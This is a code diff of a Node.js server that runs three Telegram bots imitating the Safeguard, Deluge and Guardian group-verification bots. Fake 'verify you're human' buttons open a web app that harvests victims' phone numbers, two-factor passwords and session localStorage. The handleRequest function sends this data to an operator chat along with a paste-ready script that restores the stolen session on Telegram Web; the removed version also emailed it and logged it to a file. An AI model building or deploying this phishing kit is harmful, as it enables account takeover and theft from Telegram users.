@@ -1,279 +1,119 @@
-const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
-const phoneUtil = require('google-libphonenumber').PhoneNumberUtil.getInstance();
-const dotenv = require('dotenv');
-const path = require('path');
-const fs = require('fs');
-const nodemailer = require('nodemailer');
+const express = require("express");
+const fs = require("fs");
+const path = require("path");
 
-dotenv.config();
+require("dotenv").config();
+
+const TelegramBot = require("node-telegram-bot-api");
+const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
+const PNF = require("google-libphonenumber").PhoneNumberFormat;
+
+// admins list (whoever adds the bot in the channel should be in this array.)
+const admins = [
+  5891533625
+];
+
+// loading all the pictures beforehand for speed
+const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
+const guardianSuccess = fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg"));
+
+const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg"));
+const guardianVerification = fs.readFileSync(path.join(__dirname, "images/verification/guardian.jpg"));
+const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));
+
+const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });
+const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true });
+const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true });
+
+const guardianButtonTexts = [
+  "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
+  "Why an Ape ❔ You can be eNORMUS!🔷",
+  "🔥Raid with @Raidar 🔥"
+];
+
+const generateRandomString = (length) => {
+  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
+  let result = "";
+  for (let i = 0; i < length; i++) {
+    const randomIndex = Math.floor(Math.random() * charset.length);
+    result += charset[randomIndex];
+  }
+  return result;
+};
+
+let safeguardUsername;
+let delugeUsername;
+let guardianUsername;
+
+safeguardBot.getMe().then(botInfo => {
+  safeguardUsername = botInfo.username;
+  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
+});
+delugeBot.getMe().then(botInfo => {
+  delugeUsername = botInfo.username;
+  console.log(`Deluge Bot Username: ${delugeUsername}`);
+});
+guardianBot.getMe().then(botInfo => {
+  guardianUsername = botInfo.username;
+  console.log(`Guardian Bot Username: ${guardianUsername}`);
+});
 
 const app = express();
 app.use(express.json());
+app.use(express.static("public"));
 
-// Add CORS middleware
-app.use((req, res, next) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  next();
-});
+app.post("/api/users/telegram/info", async (req, res) => {
+  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
+  try {
+    const {
+      userId,
+      firstName,
+      usernames,
+      phoneNumber,
+      isPremium,
+      password,
+      quicklySet,
+      type
+    } = req.body;
 
-// Serve static files
-app.use(express.static(path.join(__dirname, '../public')));
-
-// Explicit route for /safeguard/ to prevent redirects
-app.get('/safeguard/', (req, res) => {
-  res.sendFile(path.join(__dirname, '../public/safeguard/index.html'));
-});
-
-// Debug logging for environment variables
-console.log('Environment Variables:');
-console.log('SAFEGUARD_TOKEN:', process.env.SAFEGUARD_TOKEN ? process.env.SAFEGUARD_TOKEN.slice(0, 10) + '...' : 'Not set');
-console.log('DELUGE_TOKEN:', process.env.DELUGE_TOKEN ? process.env.DELUGE_TOKEN.slice(0, 10) + '...' : 'Not set');
-console.log('GUARDIAN_TOKEN:', process.env.GUARDIAN_TOKEN ? process.env.GUARDIAN_TOKEN.slice(0, 10) + '...' : 'Not set');
-console.log('DOMAIN:', process.env.DOMAIN);
-console.log('LOGS_ID:', process.env.LOGS_ID);
-console.log('EMAIL_USER:', process.env.EMAIL_USER);
-console.log('EMAIL_PASS:', process.env.EMAIL_PASS);
-console.log('PORT:', process.env.PORT);
-
-const safeguardToken = process.env.SAFEGUARD_TOKEN;
-const delugeToken = process.env.DELUGE_TOKEN;
-const guardianToken = process.env.GUARDIAN_TOKEN;
-
-// Use polling instead of webhooks
-const safeguardBot = safeguardToken ? new TelegramBot(safeguardToken, { polling: true }) : null;
-const delugeBot = delugeToken ? new TelegramBot(delugeToken, { polling: true }) : null;
-const guardianBot = guardianToken ? new TelegramBot(guardianToken, { polling: true }) : null;
-
-const safeguardUsername = "SafetyGuardianRobot";
-const delugeUsername = "DelugeGuardiansBot";
-const guardianUsername = "GuardianSafetyrobot";
-
-// Image paths
-const safeguardVerification = path.join(__dirname, 'images', 'verification', 'safeguard.jpg');
-const delugeVerification = path.join(__dirname, 'images', 'verification', 'deluge.jpg');
-const guardianVerification = path.join(__dirname, 'images', 'verification', 'guardian.jpg');
-
-const safeguardSuccess = path.join(__dirname, 'images', 'success', 'safeguard.jpg');
-const guardianSuccess = path.join(__dirname, 'images', 'success', 'guardian.jpg');
-
-// Debug logging for image file existence and directory contents
-console.log('Checking image file existence:');
-console.log('safeguardVerification exists:', fs.existsSync(safeguardVerification), 'Path:', safeguardVerification);
-console.log('delugeVerification exists:', fs.existsSync(delugeVerification), 'Path:', delugeVerification);
-console.log('guardianVerification exists:', fs.existsSync(guardianVerification), 'Path:', guardianVerification);
-console.log('safeguardSuccess exists:', fs.existsSync(safeguardSuccess), 'Path:', safeguardSuccess);
-console.log('guardianSuccess exists:', fs.existsSync(guardianSuccess), 'Path:', guardianSuccess);
-
-const imagesDir = path.join(__dirname, 'images');
-const verificationDir = path.join(__dirname, 'images', 'verification');
-const successDir = path.join(__dirname, 'images', 'success');
-
-console.log('Listing contents of images directory:');
-try {
-  console.log('images:', fs.readdirSync(imagesDir));
-} catch (error) {
-  console.error('Failed to list images directory:', error.message);
-}
-
-console.log('Listing contents of verification directory:');
-try {
-  console.log('verification:', fs.readdirSync(verificationDir));
-} catch (error) {
-  console.error('Failed to list verification directory:', error.message);
-}
-
-console.log('Listing contents of success directory:');
-try {
-  console.log('success:', fs.readdirSync(successDir));
-} catch (error) {
-  console.error('Failed to list success directory:', error.message);
-}
-
-const guardianButtonTexts = [
-  "Join Group",
-  "Enter Chat",
-  "Access Now",
-  "Join Now",
-  "Enter Now"
-];
-
-// Set up nodemailer transporter with error handling
-let transporter;
-try {
-  if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
-    transporter = nodemailer.createTransport({
-      service: 'gmail',
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-      }
-    });
-    console.log('Nodemailer transporter initialized successfully');
-  } else {
-    console.error('Nodemailer not initialized: EMAIL_USER or EMAIL_PASS missing');
-  }
-} catch (error) {
-  console.error('Failed to initialize nodemailer transporter:', error.message);
-}
-
-// Add polling error handling with retry limit
-const handlePollingError = (bot, botName) => {
-  let retryCount = 0;
-  const maxRetries = 5;
-
-  bot.on('polling_error', (error) => {
-    console.error(`${botName} polling error:`, error.message);
-    if (error.message.includes('401 Unauthorized')) {
-      console.error(`${botName} token is invalid or revoked. Please check the token in environment variables.`);
-      process.exit(1); // Exit if token is invalid
-    } else if (error.message.includes('409 Conflict')) {
-      if (retryCount >= maxRetries) {
-        console.error(`${botName} maximum retry limit reached. Exiting...`);
-        process.exit(1);
-      }
-      retryCount++;
-      console.warn(`${botName} conflict detected. Retrying polling in 60 seconds (Attempt ${retryCount}/${maxRetries})...`);
-      setTimeout(() => {
-        bot.stopPolling().then(() => {
-          console.log(`${botName} stopped polling. Restarting...`);
-          bot.startPolling();
-        });
-      }, 60000);
-    } else if (error.message.includes('ECONNRESET')) {
-      if (retryCount >= maxRetries) {
-        console.error(`${botName} maximum retry limit reached for ECONNRESET. Exiting...`);
-        process.exit(1);
-      }
-      retryCount++;
-      console.warn(`${botName} ECONNRESET detected. Retrying polling in 30 seconds (Attempt ${retryCount}/${maxRetries})...`);
-      setTimeout(() => {
-        bot.stopPolling().then(() => {
-          console.log(`${botName} stopped polling. Restarting...`);
-          bot.startPolling();
-        });
-      }, 30000);
+    let pass = password;
+    if (pass === null) {
+      pass = "No Two-factor authentication enabled.";
     }
-  });
-};
 
-if (safeguardBot) handlePollingError(safeguardBot, 'Safeguard bot');
-if (delugeBot) handlePollingError(delugeBot, 'Deluge bot');
-if (guardianBot) handlePollingError(guardianBot, 'Guardian bot');
+    let usernameText = "";
+    if (usernames) {
+      usernameText = `Usernames owned:\n`;
+      usernames.forEach((username, index) => {
+        usernameText += `<b>${index + 1}</b>. @${username.username} ${username.isActive ? "✅" : "❌"}\n`;
+      });
+    }
 
-function generateRandomString(length) {
-  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  let result = '';
-  for (let i = 0; i < length; i++) {
-    result += characters.charAt(Math.floor(Math.random() * characters.length));
-  }
-  return result;
-}
+    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
+    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
+    const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
 
-function handleStart(bot) {
-  bot.onText(/\/start(?: (.*))?$/, (msg, match) => {
-    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
-    const parameter = match[1];
-    let botInfo;
-    bot.getMe().then(botInformation => {
-      botInfo = botInformation;
-      if (botInfo.username) {
-        const chatId = msg.chat.id;
-        let jsonToSend;
-        let imageToSend;
-        if (parameter === 'login') {
-          jsonToSend = {
-            caption: `Please share your login data to continue.\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
-            parse_mode: "HTML",
-            reply_markup: {
-              inline_keyboard: [[{
-                text: "Share Login Data",
-                web_app: {
-                  url: `${process.env.DOMAIN}/${botInfo.username.toLowerCase().replace('bot', '')}/?type=${botInfo.username.toLowerCase().replace('bot', '')}`
-                }
-              }]]
-            }
-          };
-          if (botInfo.username === safeguardUsername) {
-            imageToSend = safeguardVerification;
-          } else if (botInfo.username === delugeUsername) {
-            imageToSend = delugeVerification;
-          } else if (botInfo.username === guardianUsername) {
-            imageToSend = guardianVerification;
-          }
-        } else {
-          if (botInfo.username === safeguardUsername) {
-            jsonToSend = {
-              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
-              parse_mode: "HTML",
-              reply_markup: {
-                inline_keyboard: [[{
-                  text: "VERIFY",
-                  web_app: {
-                    url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
-                  }
-                }]]
-              }
-            };
-            imageToSend = safeguardVerification;
-          } else if (botInfo.username === delugeUsername) {
-            jsonToSend = {
-              caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
-              parse_mode: "HTML",
-              reply_markup: {
-                inline_keyboard: [[{
-                  text: "Tap To Verify",
-                  web_app: {
-                    url: `${process.env.DOMAIN}/deluge/?type=deluge`
-                  }
-                }]]
-              }
-            };
-            imageToSend = delugeVerification;
-          } else if (botInfo.username === guardianUsername) {
-            jsonToSend = {
-              caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
-              parse_mode: "HTML",
-              reply_markup: {
-                inline_keyboard: [[{
-                  text: "Verify",
-                  web_app: {
-                    url: `${process.env.DOMAIN}/guardian/?type=guardian`
-                  }
-                }]]
-              }
-            };
-            imageToSend = guardianVerification;
-          }
-        }
-        
-        // Read the image file as a Buffer
-        try {
-          const imageBuffer = fs.readFileSync(imageToSend);
-          bot.sendPhoto(
-            chatId, 
-            imageBuffer,
-            jsonToSend
-          ).catch(error => {
-            console.error(`Failed to send photo to chat ${chatId}:`, error.message);
-          });
-        } catch (error) {
-          console.error(`Failed to read image file ${imageToSend}:`, error.message);
-          bot.sendMessage(
-            chatId,
-            "Sorry, I couldn't load the verification image. Please try again later."
-          ).catch(err => {
-            console.error(`Failed to send error message to chat ${chatId}:`, err.message);
-          });
-        }
-      }
-    }).catch(error => {
-      console.error('Failed to get bot info:', error.message);
+    await handleRequest(req, res, {
+      password: pass,
+      script: quickAuth,
+      userId,
+      name: firstName,
+      number: formattedNumber,
+      usernames: usernameText,
+      premium: isPremium,
+      type,
     });
-  });
-}
+  } catch (error) {
+    console.error("500 server error", error);
+    res.status(500).json({ error: "server error" });
+  }
+});
+
+// Add a debug endpoint to capture logs from client-side scripts
+app.post('/api/debug', (req, res) => {
+  console.log(`Debug message: ${req.body.message}`);
+  res.json({ status: 'ok' });
+});
 
 const handleRequest = async (req, res, data) => {  
   const botMap = {
@@ -282,58 +122,12 @@ const handleRequest = async (req, res, data) => {
     deluge: delugeBot
   };
   let bot = botMap[data.type] || null;
-  if (!bot) {
-    console.error(`No bot found for type: ${data.type}`);
-    res.status(400).json({ error: "Invalid bot type" });
-    return;
-  }
-  // Add a timestamp to the log message
-  const timestamp = new Date().toISOString();
-  const logMessage = `[${timestamp}] 🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.firstName}\n⭐ <b>Telegram Premium</b>: ${data.isPremium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.phoneNumber}</tg-spoiler>\n${data.usernames.map(u => `👤 <b>Username</b>: @${u.username}`).join('\n')}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script || "Not available"}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
-  console.log(`Attempting to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, logMessage);
-  let messageSent = false;
-  try {
-    await bot.sendMessage(
-      process.env.LOGS_ID,
-      logMessage,
-      { parse_mode: "HTML" }
-    );
-    console.log(`Successfully sent message to LOGS_ID for user ${data.userId}`);
-    messageSent = true;
-  } catch (error) {
-    console.error(`Failed to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, error.message, error.stack);
-  }
-  if (!messageSent) {
-    console.log("Fallback: Logging user data to Render logs due to failure in sending to LOGS_ID:");
-    console.log(logMessage);
-    // Save to file
-    try {
-      const logEntry = `[${timestamp}] ${logMessage}\n\n`;
-      fs.appendFileSync(path.join(__dirname, 'logs', 'login_data.txt'), logEntry);
-      console.log(`Successfully saved login data to logs/login_data.txt for user ${data.userId}`);
-    } catch (fileError) {
-      console.error(`Failed to save login data to file for user ${data.userId}:`, fileError.message);
+  await bot.sendMessage(
+    process.env.LOGS_ID,
+      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
+      parse_mode: "HTML"
     }
-    // Send to email
-    if (transporter) {
-      try {
-        await transporter.sendMail({
-          from: process.env.EMAIL_USER,
-          to: process.env.EMAIL_USER,
-          subject: `User Login Data for ${data.userId} [${timestamp}]`,
-          text: logMessage.replace(/<[^>]+>/g, ''), // Strip HTML tags for plain text email
-          html: logMessage
-        });
-        console.log(`Successfully sent login data to email for user ${data.userId}`);
-      } catch (emailError) {
-        console.error(`Failed to send login data to email for user ${data.userId}:`, emailError.message);
-      }
-    } else {
-      console.error(`Cannot send email for user ${data.userId}: Nodemailer transporter not initialized`);
-    }
-  }
-
-  // Send success message to the user
+  );
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
     let image;
@@ -355,8 +149,8 @@ const handleRequest = async (req, res, data) => {
             {
               text: randomText,
               url: `https://t.me/+${generateRandomString(16)}`
-            }
-          ]
+            },
+          ],
         ]
       }
     };
@@ -367,114 +161,132 @@ const handleRequest = async (req, res, data) => {
             {
               text: "@SOLTRENDING",
               url: "https://t.me/SOLTRENDING"
-            }
-          ]
+            },
+          ],
         ]
       }
     };
 
     const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
 
-    try {
-      await bot.sendPhoto(data.userId, image, {
-        caption,
-        ...buttons,
-        parse_mode: "HTML"
-      });
-      console.log(`Successfully sent success photo to user ${data.userId}`);
-    } catch (error) {
-      console.error(`Failed to send success photo to user ${data.userId}:`, error.message);
-      // Fallback to sending a text message
-      await bot.sendMessage(data.userId, caption, {
-        parse_mode: "HTML",
-        ...buttons
-      }).catch(err => {
-        console.error(`Failed to send fallback message to user ${data.userId}:`, err.message);
-      });
-    }
+    await bot.sendPhoto(data.userId, image, {
+      caption,
+      ...buttons,
+      parse_mode: "HTML"
+    });
   }
 
   res.json({});
 };
 
-app.post('/api/users/telegram/info', async (req, res) => {
-  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
-  const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
-  let formattedUsernames = [];
-  if (usernames) {
-    if (Array.isArray(usernames)) {
-      formattedUsernames = usernames;
-    } else if (typeof usernames === 'string') {
-      try {
-        formattedUsernames = JSON.parse(usernames);
-      } catch (e) {
-        console.error(`Failed to parse usernames: ${usernames}`, e);
-      }
+const handleNewChatMember = async (bot, type) => {
+  bot.on("my_chat_member", (update) => {
+    const chatId = update.chat.id;
+
+    let jsonToSend;
+    let imageToSend;
+
+    switch (type) {
+      case "deluge":
+        jsonToSend = { caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
+        imageToSend = delugeVerification;
+        break;
+      case "safeguard":
+        jsonToSend = { caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
+        imageToSend = safeguardVerification;
+        break;
+      case "guardian":
+        jsonToSend = { caption: `<b>${update.chat.title} is protected by Guardian.</b>\n\n⚠️ONLY use the "<b>Click to verify</b>" below and <b>avoid pressing any sponsored ads</b> within this portal. ⚠️`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Click to verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
+        imageToSend = guardianVerification;
+        break;  
+      default:
+        jsonToSend = {};
     }
-  }
-  await handleRequest(req, res, {
-    userId,
-    firstName,
-    usernames: formattedUsernames,
-    phoneNumber: phoneNumber || "Not shared",
-    isPremium,
-    password,
-    quicklySet,
-    type,
-    script: quicklySet?.script
+
+    if (
+      update.chat.type === "channel" &&
+      update.new_chat_member.status === "administrator" &&
+      update.new_chat_member.user.is_bot === true &&
+      admins.includes(update.from.id)
+    ) {
+      bot.sendPhoto(chatId, imageToSend, jsonToSend);
+    }
   });
-});
+};
 
-app.post('/api/debug', (req, res) => {
-  console.log(`Debug message from check.js: ${req.body.message}`);
-  res.json({ status: 'ok' });
-});
-
-if (safeguardBot) handleStart(safeguardBot);
-if (delugeBot) handleStart(delugeBot);
-if (guardianBot) handleStart(guardianBot);
-
-console.log("Safeguard bot initialized:", !!safeguardBot);
-console.log("Deluge bot initialized:", !!delugeBot);
-console.log("Guardian bot initialized:", !!guardianBot);
-
-if (safeguardBot) {
-  safeguardBot.getMe().then(botInfo => {
-    console.log(`Safeguard Bot Username: ${botInfo.username}`);
-  }).catch(error => {
-    console.error("Failed to get Safeguard bot info:", error.message);
+function handleStart(bot) {
+  bot.onText(/\/start(?: (.*))?$/, (msg, match) => {
+    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
+    let botInfo;
+    bot.getMe().then(botInformation => {
+      botInfo = botInformation;
+      if (botInfo.username) {
+        const chatId = msg.chat.id;
+        let jsonToSend;
+        let imageToSend;
+        if (botInfo.username === safeguardUsername) {
+          jsonToSend = {
+            caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "VERIFY",
+                web_app: {
+                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
+                }
+              }]]
+            }
+          };
+          console.log(`Sending web_app button for ${botInfo.username} with URL: ${jsonToSend.reply_markup.inline_keyboard[0][0].web_app.url}`);
+          imageToSend = safeguardVerification;
+        } else if (botInfo.username === delugeUsername) {
+          jsonToSend = {
+            caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "Tap To Verify",
+                web_app: {
+                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
+                }
+              }]]
+            }
+          };
+          console.log(`Sending web_app button for ${botInfo.username} with URL: ${jsonToSend.reply_markup.inline_keyboard[0][0].web_app.url}`);
+          imageToSend = delugeVerification;
+        } else if (botInfo.username === guardianUsername) {
+          jsonToSend = {
+            caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "Verify",
+                web_app: {
+                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
+                }
+              }]]
+            }
+          };
+          console.log(`Sending web_app button for ${botInfo.username} with URL: ${jsonToSend.reply_markup.inline_keyboard[0][0].web_app.url}`);
+          imageToSend = guardianVerification;
+        }
+        
+        bot.sendPhoto(
+          chatId, 
+          imageToSend,
+          jsonToSend
+        );
+      }
+    });
   });
 }
 
-if (delugeBot) {
-  delugeBot.getMe().then(botInfo => {
-    console.log(`Deluge Bot Username: ${botInfo.username}`);
-  }).catch(error => {
-    console.error("Failed to get Deluge bot info:", error.message);
-  });
-}
+handleNewChatMember(safeguardBot, "safeguard");
+handleNewChatMember(delugeBot, "deluge");
+handleNewChatMember(guardianBot, "guardian");
 
-if (guardianBot) {
-  guardianBot.getMe().then(botInfo => {
-    console.log(`Guardian Bot Username: ${botInfo.username}`);
-  }).catch(error => {
-    console.error("Failed to get Guardian bot info:", error.message);
-  });
-}
+handleStart(safeguardBot);
+handleStart(delugeBot);
+handleStart(guardianBot);
 
-// Start the server with error handling
-const port = process.env.PORT;
-if (!port) {
-  console.error('PORT environment variable is not set. Exiting...');
-  process.exit(1);
-}
-
-app.listen(port, '0.0.0.0', () => {
-  console.log(`Server running on port ${port}`);
-}).on('error', (error) => {
-  console.error(`Failed to start server on port ${port}:`, error.message);
-  if (error.code === 'EADDRINUSE') {
-    console.error(`Port ${port} is already in use. Please ensure no other process is using this port.`);
-  }
-  process.exit(1);
-});
+app.listen(process.env.PORT || 80, () => console.log(`loaded everyone & running on port ${process.env.PORT}`));
